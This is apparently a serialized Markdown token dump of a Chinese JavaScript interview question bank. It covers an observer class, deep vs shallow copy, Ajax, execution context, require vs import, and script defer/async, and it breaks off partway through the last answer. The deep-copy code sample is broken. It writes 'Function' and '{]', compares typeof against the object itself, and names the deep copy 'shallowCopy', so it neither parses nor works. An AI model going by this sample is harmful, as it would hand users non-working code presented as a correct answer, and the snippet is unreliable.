{\\n  caches = {}; // 事件中心\\n  \\n  // eventName事件名-独一无二, fn订阅后执行的自定义行为\\n  on (eventName, fn){ \\n    this.caches[eventName] = this.caches[eventName] || [];\\n    this.caches[eventName].push(fn);\\n  }\\n  \\n  // 发布 => 将订阅的事件进行统一执行\\n  emit (eventName, data) { \\n    if (this.caches[eventName]) {\\n      this.caches[eventName]\\n      .forEach(fn => fn(data));\\n    }\\n  }\\n  // 取消订阅 => 若fn不传, 直接取消该事件所有订阅信息\\n  off (eventName, fn) { \\n    if (this.caches[eventName]) {\\n      const newCaches = fn \\n        ? this.caches[eventName].filter(e => e !== fn) \\n        : [];\\n      this.caches[eventName] = newCaches;\\n    }\\n  }\\n​\\n}\\n\\n    ob = new Observer();\\n    ​\\n    l1 = (data) => console.log(`l1_${data}`)\\n    l2 = (data) => console.log(`l2_${data}`)\\n    ​\\n    ob.on(\'event1\',l1)\\n    ob.on(\'event1\',l2)\\n    ​\\n    //发布订阅\\n    ob.emit(\'event1\',789) \\n    // l1_789\\n    // l2_789\\n    ​\\n    // 取消，订阅l1\\n    ob.off(\'event1\',l1)\\n    ​\\n    ob.emit(\'event1\',567)\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 35. 深浅拷贝的区别？如何实现一个深拷贝？\\n\\n","depth":2,"text":"35. 深浅拷贝的区别？如何实现一个深拷贝？","tokens":[{"type":"text","raw":"35. 深浅拷贝的区别？如何实现一个深拷贝？","text":"35. 深浅拷贝的区别？如何实现一个深拷贝？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 深浅拷贝通常只针对引用类型\\n\\n- 浅拷贝：只拷贝一层对象，复制这一层对象中的原始值，如果有引用类型的话，就复制它的指针\\n\\n- 深拷贝：层层拷贝，所有类型的属性值都会被复制，原对象的修改不会影响拷贝后的对象 JSON.parse(JSON.stringify(obj)) --- 无法处理 undefined Symbol function -- 无法处理循环引用","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 深浅拷贝通常只针对引用类型\\n\\n","task":false,"loose":true,"text":"深浅拷贝通常只针对引用类型\\n","tokens":[{"type":"text","raw":"深浅拷贝通常只针对引用类型\\n","text":"深浅拷贝通常只针对引用类型","tokens":[{"type":"text","raw":"深浅拷贝通常只针对引用类型","text":"深浅拷贝通常只针对引用类型","escaped":false}]}]},{"type":"list_item","raw":"- 浅拷贝：只拷贝一层对象，复制这一层对象中的原始值，如果有引用类型的话，就复制它的指针\\n\\n","task":false,"loose":true,"text":"浅拷贝：只拷贝一层对象，复制这一层对象中的原始值，如果有引用类型的话，就复制它的指针\\n","tokens":[{"type":"text","raw":"浅拷贝：只拷贝一层对象，复制这一层对象中的原始值，如果有引用类型的话，就复制它的指针\\n","text":"浅拷贝：只拷贝一层对象，复制这一层对象中的原始值，如果有引用类型的话，就复制它的指针","tokens":[{"type":"text","raw":"浅拷贝：只拷贝一层对象，复制这一层对象中的原始值，如果有引用类型的话，就复制它的指针","text":"浅拷贝：只拷贝一层对象，复制这一层对象中的原始值，如果有引用类型的话，就复制它的指针","escaped":false}]}]},{"type":"list_item","raw":"- 深拷贝：层层拷贝，所有类型的属性值都会被复制，原对象的修改不会影响拷贝后的对象 JSON.parse(JSON.stringify(obj)) --- 无法处理 undefined Symbol function -- 无法处理循环引用","task":false,"loose":true,"text":"深拷贝：层层拷贝，所有类型的属性值都会被复制，原对象的修改不会影响拷贝后的对象 JSON.parse(JSON.stringify(obj)) --- 无法处理 undefined Symbol function -- 无法处理循环引用","tokens":[{"type":"text","raw":"深拷贝：层层拷贝，所有类型的属性值都会被复制，原对象的修改不会影响拷贝后的对象 JSON.parse(JSON.stringify(obj)) --- 无法处理 undefined Symbol function -- 无法处理循环引用","text":"深拷贝：层层拷贝，所有类型的属性值都会被复制，原对象的修改不会影响拷贝后的对象 JSON.parse(JSON.stringify(obj)) --- 无法处理 undefined Symbol function -- 无法处理循环引用","tokens":[{"type":"text","raw":"深拷贝：层层拷贝，所有类型的属性值都会被复制，原对象的修改不会影响拷贝后的对象 JSON.parse(JSON.stringify(obj)) --- 无法处理 undefined Symbol function -- 无法处理循环引用","text":"深拷贝：层层拷贝，所有类型的属性值都会被复制，原对象的修改不会影响拷贝后的对象 JSON.parse(JSON.stringify(obj)) --- 无法处理 undefined Symbol function -- 无法处理循环引用","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nFunction  shallowCopy(obj){\\n      let newObj = {]\\n      for( let key in  obj ){\\n        if(obj.hasOwnProperty(key)){ \\n        //hasOwnProperty检测对象自己身上方法而不是原先链上的\\n          newObj[key]=obj[key]\\n        }\\n      }\\n      return  newObj\\n} \\n// 咱们会浅拷贝当然还要深拷贝呀  开始\\nFunction  shallowCopy(obj){\\n      let newObj = {]\\n      for( let key in  obj ){\\n        if(obj.hasOwnProperty(key)){ \\n        //hasOwnProperty检测对象自己身上方法而不是原先链上的\\n        if  ( typeof(obj[key])!==obj||obj[key]===null){\\n           newObj[key]=obj[key]\\n        }else{\\n           newObj[key]=shallowCopy(obj[key])\\n        }  \\n        }\\n      }\\n      return  newObj\\n}\\n```","lang":"js","text":"\\nFunction  shallowCopy(obj){\\n      let newObj = {]\\n      for( let key in  obj ){\\n        if(obj.hasOwnProperty(key)){ \\n        //hasOwnProperty检测对象自己身上方法而不是原先链上的\\n          newObj[key]=obj[key]\\n        }\\n      }\\n      return  newObj\\n} \\n// 咱们会浅拷贝当然还要深拷贝呀  开始\\nFunction  shallowCopy(obj){\\n      let newObj = {]\\n      for( let key in  obj ){\\n        if(obj.hasOwnProperty(key)){ \\n        //hasOwnProperty检测对象自己身上方法而不是原先链上的\\n        if  ( typeof(obj[key])!==obj||obj[key]===null){\\n           newObj[key]=obj[key]\\n        }else{\\n           newObj[key]=shallowCopy(obj[key])\\n        }  \\n        }\\n      }\\n      return  newObj\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 36. 说说Ajax的原理\\n\\n","depth":2,"text":"36. 说说Ajax的原理","tokens":[{"type":"text","raw":"36. 说说Ajax的原理","text":"36. 说说Ajax的原理","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- Async Javascript and XML ，是一种异步js和网页交互的技术，可以实现不刷新网页就跟服务器交换数据，更新页面。\\n\\n- 创建XHR实例对象\\n\\n- 调用实例对象中的open方法与服务器建立连接\\n\\n- 调用实例对象中的send方法发送请求\\n\\n- 监听onreadystatechange事件，通过判断readyState的值来获取到最终的数据\\n\\n- 将数据更新到html页面","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Async Javascript and XML ，是一种异步js和网页交互的技术，可以实现不刷新网页就跟服务器交换数据，更新页面。\\n\\n","task":false,"loose":true,"text":"Async Javascript and XML ，是一种异步js和网页交互的技术，可以实现不刷新网页就跟服务器交换数据，更新页面。\\n","tokens":[{"type":"text","raw":"Async Javascript and XML ，是一种异步js和网页交互的技术，可以实现不刷新网页就跟服务器交换数据，更新页面。\\n","text":"Async Javascript and XML ，是一种异步js和网页交互的技术，可以实现不刷新网页就跟服务器交换数据，更新页面。","tokens":[{"type":"text","raw":"Async Javascript and XML ，是一种异步js和网页交互的技术，可以实现不刷新网页就跟服务器交换数据，更新页面。","text":"Async Javascript and XML ，是一种异步js和网页交互的技术，可以实现不刷新网页就跟服务器交换数据，更新页面。","escaped":false}]}]},{"type":"list_item","raw":"- 创建XHR实例对象\\n\\n","task":false,"loose":true,"text":"创建XHR实例对象\\n","tokens":[{"type":"text","raw":"创建XHR实例对象\\n","text":"创建XHR实例对象","tokens":[{"type":"text","raw":"创建XHR实例对象","text":"创建XHR实例对象","escaped":false}]}]},{"type":"list_item","raw":"- 调用实例对象中的open方法与服务器建立连接\\n\\n","task":false,"loose":true,"text":"调用实例对象中的open方法与服务器建立连接\\n","tokens":[{"type":"text","raw":"调用实例对象中的open方法与服务器建立连接\\n","text":"调用实例对象中的open方法与服务器建立连接","tokens":[{"type":"text","raw":"调用实例对象中的open方法与服务器建立连接","text":"调用实例对象中的open方法与服务器建立连接","escaped":false}]}]},{"type":"list_item","raw":"- 调用实例对象中的send方法发送请求\\n\\n","task":false,"loose":true,"text":"调用实例对象中的send方法发送请求\\n","tokens":[{"type":"text","raw":"调用实例对象中的send方法发送请求\\n","text":"调用实例对象中的send方法发送请求","tokens":[{"type":"text","raw":"调用实例对象中的send方法发送请求","text":"调用实例对象中的send方法发送请求","escaped":false}]}]},{"type":"list_item","raw":"- 监听onreadystatechange事件，通过判断readyState的值来获取到最终的数据\\n\\n","task":false,"loose":true,"text":"监听onreadystatechange事件，通过判断readyState的值来获取到最终的数据\\n","tokens":[{"type":"text","raw":"监听onreadystatechange事件，通过判断readyState的值来获取到最终的数据\\n","text":"监听onreadystatechange事件，通过判断readyState的值来获取到最终的数据","tokens":[{"type":"text","raw":"监听onreadystatechange事件，通过判断readyState的值来获取到最终的数据","text":"监听onreadystatechange事件，通过判断readyState的值来获取到最终的数据","escaped":false}]}]},{"type":"list_item","raw":"- 将数据更新到html页面","task":false,"loose":true,"text":"将数据更新到html页面","tokens":[{"type":"text","raw":"将数据更新到html页面","text":"将数据更新到html页面","tokens":[{"type":"text","raw":"将数据更新到html页面","text":"将数据更新到html页面","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 37. 什么是执行上下文和执行栈？\\n\\n","depth":2,"text":"37. 什么是执行上下文和执行栈？","tokens":[{"type":"text","raw":"37. 什么是执行上下文和执行栈？","text":"37. 什么是执行上下文和执行栈？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- 变量或函数的执行上下文，决定了它们的行为以及可以访问哪些数据。每个上下文都有一个关联的变量对象，而这个上下文中定义的所有变量和函数都存在于这个对象上(如DOM中全局上下文关联的便是window对象)。\\n\\n- 每个函数调用都有自己的上下文。当代码执行流进入函数时，函数的上下文被推到一个执行栈中。在函数执行完之后，执行栈会弹出该函数上下文，在其上的所有变量和函数都会被销毁，并将控制权返还给之前的执行上下文。 JS的执行流就是通过这个执行栈进行控制的。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 变量或函数的执行上下文，决定了它们的行为以及可以访问哪些数据。每个上下文都有一个关联的变量对象，而这个上下文中定义的所有变量和函数都存在于这个对象上(如DOM中全局上下文关联的便是window对象)。\\n\\n","task":false,"loose":true,"text":"变量或函数的执行上下文，决定了它们的行为以及可以访问哪些数据。每个上下文都有一个关联的变量对象，而这个上下文中定义的所有变量和函数都存在于这个对象上(如DOM中全局上下文关联的便是window对象)。\\n","tokens":[{"type":"text","raw":"变量或函数的执行上下文，决定了它们的行为以及可以访问哪些数据。每个上下文都有一个关联的变量对象，而这个上下文中定义的所有变量和函数都存在于这个对象上(如DOM中全局上下文关联的便是window对象)。\\n","text":"变量或函数的执行上下文，决定了它们的行为以及可以访问哪些数据。每个上下文都有一个关联的变量对象，而这个上下文中定义的所有变量和函数都存在于这个对象上(如DOM中全局上下文关联的便是window对象)。","tokens":[{"type":"text","raw":"变量或函数的执行上下文，决定了它们的行为以及可以访问哪些数据。每个上下文都有一个关联的变量对象，而这个上下文中定义的所有变量和函数都存在于这个对象上(如DOM中全局上下文关联的便是window对象)。","text":"变量或函数的执行上下文，决定了它们的行为以及可以访问哪些数据。每个上下文都有一个关联的变量对象，而这个上下文中定义的所有变量和函数都存在于这个对象上(如DOM中全局上下文关联的便是window对象)。","escaped":false}]}]},{"type":"list_item","raw":"- 每个函数调用都有自己的上下文。当代码执行流进入函数时，函数的上下文被推到一个执行栈中。在函数执行完之后，执行栈会弹出该函数上下文，在其上的所有变量和函数都会被销毁，并将控制权返还给之前的执行上下文。 JS的执行流就是通过这个执行栈进行控制的。","task":false,"loose":true,"text":"每个函数调用都有自己的上下文。当代码执行流进入函数时，函数的上下文被推到一个执行栈中。在函数执行完之后，执行栈会弹出该函数上下文，在其上的所有变量和函数都会被销毁，并将控制权返还给之前的执行上下文。 JS的执行流就是通过这个执行栈进行控制的。","tokens":[{"type":"text","raw":"每个函数调用都有自己的上下文。当代码执行流进入函数时，函数的上下文被推到一个执行栈中。在函数执行完之后，执行栈会弹出该函数上下文，在其上的所有变量和函数都会被销毁，并将控制权返还给之前的执行上下文。 JS的执行流就是通过这个执行栈进行控制的。","text":"每个函数调用都有自己的上下文。当代码执行流进入函数时，函数的上下文被推到一个执行栈中。在函数执行完之后，执行栈会弹出该函数上下文，在其上的所有变量和函数都会被销毁，并将控制权返还给之前的执行上下文。 JS的执行流就是通过这个执行栈进行控制的。","tokens":[{"type":"text","raw":"每个函数调用都有自己的上下文。当代码执行流进入函数时，函数的上下文被推到一个执行栈中。在函数执行完之后，执行栈会弹出该函数上下文，在其上的所有变量和函数都会被销毁，并将控制权返还给之前的执行上下文。 JS的执行流就是通过这个执行栈进行控制的。","text":"每个函数调用都有自己的上下文。当代码执行流进入函数时，函数的上下文被推到一个执行栈中。在函数执行完之后，执行栈会弹出该函数上下文，在其上的所有变量和函数都会被销毁，并将控制权返还给之前的执行上下文。 JS的执行流就是通过这个执行栈进行控制的。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 38. 作用域和执行上下文的区别是什么？\\n\\n","depth":2,"text":"38. 作用域和执行上下文的区别是什么？","tokens":[{"type":"text","raw":"38. 作用域和执行上下文的区别是什么？","text":"38. 作用域和执行上下文的区别是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- 函数的执行上下文只在函数被调用时生成，而其作用域在创建时已经生成；\\n\\n- 函数的作用域会包含若干个执行上下文(有可能是零个，当函数未被调用时)。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 函数的执行上下文只在函数被调用时生成，而其作用域在创建时已经生成；\\n\\n","task":false,"loose":true,"text":"函数的执行上下文只在函数被调用时生成，而其作用域在创建时已经生成；\\n","tokens":[{"type":"text","raw":"函数的执行上下文只在函数被调用时生成，而其作用域在创建时已经生成；\\n","text":"函数的执行上下文只在函数被调用时生成，而其作用域在创建时已经生成；","tokens":[{"type":"text","raw":"函数的执行上下文只在函数被调用时生成，而其作用域在创建时已经生成；","text":"函数的执行上下文只在函数被调用时生成，而其作用域在创建时已经生成；","escaped":false}]}]},{"type":"list_item","raw":"- 函数的作用域会包含若干个执行上下文(有可能是零个，当函数未被调用时)。","task":false,"loose":true,"text":"函数的作用域会包含若干个执行上下文(有可能是零个，当函数未被调用时)。","tokens":[{"type":"text","raw":"函数的作用域会包含若干个执行上下文(有可能是零个，当函数未被调用时)。","text":"函数的作用域会包含若干个执行上下文(有可能是零个，当函数未被调用时)。","tokens":[{"type":"text","raw":"函数的作用域会包含若干个执行上下文(有可能是零个，当函数未被调用时)。","text":"函数的作用域会包含若干个执行上下文(有可能是零个，当函数未被调用时)。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 39. require/import之间的区别？\\n\\n","depth":2,"text":"39. require/import之间的区别？","tokens":[{"type":"text","raw":"39. require/import之间的区别？","text":"39. require/import之间的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- require是CommonJS语法，import是ES6语法；\\n\\n- require只在后端服务器支持，import在高版本浏览器及Node中都可以支持；\\n\\n- require引入的是原始导出值的复制，import则是导出值的引用；\\n\\n- require时运行时动态加载，import是静态编译；\\n\\n- require调用时默认不是严格模式，import则默认调用严格模式.","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- require是CommonJS语法，import是ES6语法；\\n\\n","task":false,"loose":true,"text":"require是CommonJS语法，import是ES6语法；\\n","tokens":[{"type":"text","raw":"require是CommonJS语法，import是ES6语法；\\n","text":"require是CommonJS语法，import是ES6语法；","tokens":[{"type":"text","raw":"require是CommonJS语法，import是ES6语法；","text":"require是CommonJS语法，import是ES6语法；","escaped":false}]}]},{"type":"list_item","raw":"- require只在后端服务器支持，import在高版本浏览器及Node中都可以支持；\\n\\n","task":false,"loose":true,"text":"require只在后端服务器支持，import在高版本浏览器及Node中都可以支持；\\n","tokens":[{"type":"text","raw":"require只在后端服务器支持，import在高版本浏览器及Node中都可以支持；\\n","text":"require只在后端服务器支持，import在高版本浏览器及Node中都可以支持；","tokens":[{"type":"text","raw":"require只在后端服务器支持，import在高版本浏览器及Node中都可以支持；","text":"require只在后端服务器支持，import在高版本浏览器及Node中都可以支持；","escaped":false}]}]},{"type":"list_item","raw":"- require引入的是原始导出值的复制，import则是导出值的引用；\\n\\n","task":false,"loose":true,"text":"require引入的是原始导出值的复制，import则是导出值的引用；\\n","tokens":[{"type":"text","raw":"require引入的是原始导出值的复制，import则是导出值的引用；\\n","text":"require引入的是原始导出值的复制，import则是导出值的引用；","tokens":[{"type":"text","raw":"require引入的是原始导出值的复制，import则是导出值的引用；","text":"require引入的是原始导出值的复制，import则是导出值的引用；","escaped":false}]}]},{"type":"list_item","raw":"- require时运行时动态加载，import是静态编译；\\n\\n","task":false,"loose":true,"text":"require时运行时动态加载，import是静态编译；\\n","tokens":[{"type":"text","raw":"require时运行时动态加载，import是静态编译；\\n","text":"require时运行时动态加载，import是静态编译；","tokens":[{"type":"text","raw":"require时运行时动态加载，import是静态编译；","text":"require时运行时动态加载，import是静态编译；","escaped":false}]}]},{"type":"list_item","raw":"- require调用时默认不是严格模式，import则默认调用严格模式.","task":false,"loose":true,"text":"require调用时默认不是严格模式，import则默认调用严格模式.","tokens":[{"type":"text","raw":"require调用时默认不是严格模式，import则默认调用严格模式.","text":"require调用时默认不是严格模式，import则默认调用严格模式.","tokens":[{"type":"text","raw":"require调用时默认不是严格模式，import则默认调用严格模式.","text":"require调用时默认不是严格模式，import则默认调用严格模式.","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 40. script标签中defer和async的区别？\\n\\n","depth":2,"text":"40. script标签中defer和async的区别？","tokens":[{"type":"text","raw":"40. script标签中defer和async的区别？","text":"40. script标签中defer和async的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- defer 和 async属性都是去异步加载外部的JS脚本文件，它们都不会阻塞页面HTML的解析，其区别如下：\\n\\n- 执行顺序： 多个带async属性的标签，不能保证加载的顺序；多个带defer属性的标签，按照加载顺序执行；\\n\\n- 脚本是否并行执行：async属性，表示 后续文档的加载和执行与js脚本的加载和执行是并行进行的，即异步执行；defer属性，加载后续文档的过程和js脚本的加载(此时仅加载不执行)是并行进行的(异步)，js脚本需要等到文档所有元素解析完成之后才执行，DOMContentLoaded事件触发执行之前。\\n\\n- 没有 defer 或 async，浏览器会立即加载并执行指定的脚本，之前加载到一半的HTML页面会停止下来，被阻塞加载。\\n\\n- 有 async，加载和渲染后续文档元素的过程将和 script.js 的加载与执行并行进行，将script变成异步，当scripet异步解析完成后，如果HTML页面还没有完成解析，又会继续阻塞页面的解析。\\n\\n- 有 defer，加载后续文档元素的过程将和 script.js 的加载并行进行，将script变成异步。但是 script.js 的执行要在所有元素解析完成之后，类似于将这个script放在了页面的底部。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- defer 和 async属性都是去异步加载外部的JS脚本文件，它们都不会阻塞页面HTML的解析，其区别如下：\\n\\n","task":false,"loose":true,"text":"defer 和 async属性都是去异步加载外部的JS脚本文件，它们都不会阻塞页面HTML的解析，其区别如下：\\n","tokens":[{"type":"text","raw":"defer 和 async属性都是去异步加载外部的JS脚本文件，它们都不会阻塞页面HTML的解析，其区别如下：\\n","text":"defer 和 async属性都是去异步加载外部的JS脚本文件，它们都不会阻塞页面HTML的解析，其区别如下：","tokens":[{"type":"text","raw":"defer 和 async属性都是去异步加载外部的JS脚本文件，它们都不会阻塞页面HTML的解析，其区别如下：","text":"defer 和 async属性都是去异步加载外部的JS脚本文件，它们都不会阻塞页面HTML的解析，其区别如下：","escaped":false}]}]},{"type":"list_item","raw":"- 执行顺序： 多个带async属性的标签，不能保证加载的顺序；多个带defer属性的标签，按照加载顺序执行；\\n\\n","task":false,"loose":true,"text":"执行顺序： 多个带async属性的标签，不能保证加载的顺序；多个带defer属性的标签，按照加载顺序执行；\\n","tokens":[{"type":"text","raw":"执行顺序： 多个带async属性的标签，不能保证加载的顺序；多个带defer属性的标签，按照加载顺序执行；\\n","text":"执行顺序： 多个带async属性的标签，不能保证加载的顺序；多个带defer属性的标签，按照加载顺序执行；","tokens":[{"type":"text","raw":"执行顺序： 多个带async属性的标签，不能保证加载的顺序；多个带defer属性的标签，按照加载顺序执行；","text":"执行顺序： 多个带async属性的标签，不能保证加载的顺序；多个带defer属性的标签，按照加载顺序执行；","escaped":false}]}]},{"type":"list_item","raw":"- 脚本是否并行执行：async属性，表示 后续文档的加载和执行与js脚本的加载和执行是并行进行的，即异步执行；defer属性，加载后续文档的过程和js脚本的加载(此时仅加载不执行)是并行进行的(异步)，js脚本需要等到文档所有元素解析完成之后才执行，DOMContentLoaded事件触发执行之前。\\n\\n","task":false,"loose":true,"text":"脚本是否并行执行：async属性，表示 后续文档的加载和执行与js脚本的加载和执行是并行进行的，即异步执行；defer属性，加载后续文档的过程和js脚本的加载(此时仅加载不执行)是并行进行的(异步)，js脚本需要等到文档所有元素解析完成之后才执行，DOMContentLoaded事件触发执行之前。\\n","tokens":[{"type":"text","raw":"脚本是否并行执行：async属性，表示 后续文档的加载和执行与js脚本的加载和执行是并行进行的，即异步执行；defer属性，加载后续文档的过程和js脚本的加载(此时仅加载不执行)是并行进行的(异步)，js脚本需要等到文档所有元素解析完成之后才执行，DOMContentLoaded事件触发执行之前。\\n","text":"脚本是否并行执行：async属性，表示 后续文档的加载和执行与js脚本的加载和执行是并行进行的，即异步执行；defer属性，加载后续文档的过程和js脚本的加载(此时仅加载不执行)是并行进行的(异步)，js脚本需要等到文档所有元素解析完成之后才执行，DOMContentLoaded事件触发执行之前。","tokens":[{"type":"text","raw":"脚本是否并行执行：async属性，表示 后续文档的加载和执行与js脚本的加载和执行是并行进行的，即异步执行；defer属性，加载后续文档的过程和js脚本的加载(此时仅加载不执行)是并行进行的(异步)，js脚本需要等到文档所有元素解析完成之后才执行，DOMContentLoaded事件触发执行之前。","text":"脚本是否并行执行：async属性，表示 后续文档的加载和执行与js脚本的加载和执行是并行进行的，即异步执行；defer属性，加载后续文档的过程和js脚本的加载(此时仅加载不执行)是并行进行的(异步)，js脚本需要等到文档所有元素解析完成之后才执行，DOMContentLoaded事件触发执行之前。","escaped":false}]}]},{"type":"list_item","raw":"- 没有 defer 或 async，浏览器会立即加载并执行指定的脚本，之前加载到一半的HTML页面会停止下来，被阻塞加载。\\n\\n","task":false,"loose":true,"text":"没有 defer 或 async，浏览器会立即加载并执行指定的脚本，之前加载到一半的HTML页面会停止下来，被阻塞加载。\\n","tokens":[{"type":"text","raw":"没有 defer 或 